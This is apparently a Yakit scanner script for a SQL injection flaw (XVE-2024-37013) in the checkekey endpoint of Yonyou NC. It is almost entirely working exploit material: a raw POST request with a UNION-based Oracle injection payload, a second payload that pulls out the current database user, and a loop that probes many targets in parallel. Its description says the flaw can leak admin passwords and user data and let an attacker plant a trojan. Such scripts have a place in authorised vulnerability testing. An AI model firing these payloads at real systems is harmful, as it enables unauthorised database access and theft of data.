script_name: 用友NC checkekey SQL 注入漏洞(XVE-2024-37013)
content:
yakit.AutoInitYakit()

# Input your code!

info = `用友NC中checkekey存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
影响范围：
NC63、NC633、NC65

app="用友-UFIDA-NC"
`
solution = ``
payload=`user=' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(113)||CHR(113)||CHR(113)||NVL(CAST(USER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(113)||CHR(113)||CHR(113)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- PqrZ&ekey=1`

def Check(addr) {
    packet = `POST /portal/pt/office/checkekey?pageId=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close

user=1' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(80)||CHR(103)||CHR(106)||CHR(122)||CHR(81)||CHR(70)||CHR(74)||CHR(104)||CHR(106)||CHR(107)||CHR(100)||CHR(74)||CHR(105)||CHR(114)||CHR(88)||CHR(73)||CHR(112)||CHR(81)||CHR(101)||CHR(119)||CHR(116)||CHR(79)||CHR(71)||CHR(78)||CHR(115)||CHR(65)||CHR(111)||CHR(70)||CHR(103)||CHR(85)||CHR(71)||CHR(83)||CHR(101)||CHR(65)||CHR(71)||CHR(90)||CHR(114)||CHR(87)||CHR(78)||CHR(107)||CHR(113)||CHR(106)||CHR(98)||CHR(112)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1
`

    is_https = str.IsTLSServer(addr)

    rsp, req = poc.HTTP(packet, poc.replaceHost(addr), poc.https(is_https), poc.connectTimeout(5))~

    rsp1 = poc.ParseBytesToHTTPResponse(rsp)~

    code = rsp1.StatusCode
    body =string(rsp1.Body)
    if code == 500 && str.Contains(body,`qqpzqPgjzQFJhjkdJirXIpQewtOGNsAoFgUGSeAGZrWNkqjbpq`){
        risk.NewRisk(
                string(addr), 
                risk.severity("high"), 
                risk.title(string(addr) + "存在SQL注入漏洞(用友NC)"), 
                risk.description(info), 
                risk.solution(solution), 
                risk.request(string(req)), 
                risk.response(string(rsp)), 
                risk.type("sqli"),
                risk.details({"注出当前数据库用户payload":payload}), 
            )
    }

}

target = cli.Text("target", cli.setHelp("填写url或host,一行一个"), cli.setRequired(true))
cli.check()
targets = str.ParseStringToLines(target)
wg := sync.NewSizedWaitGroup(50)
for target in targets {
    yakit.Info(f"正在测试 ${target}")
    ip, port, _ = str.ParseStringToHostPort(target)
    addr = str.HostPort(ip, port)
    if port==0{
        addr=ip
    }
    wg.Add(1)
    go func() {
        defer wg.Done()
        Check(addr)
    }()
}
wg.Wait()
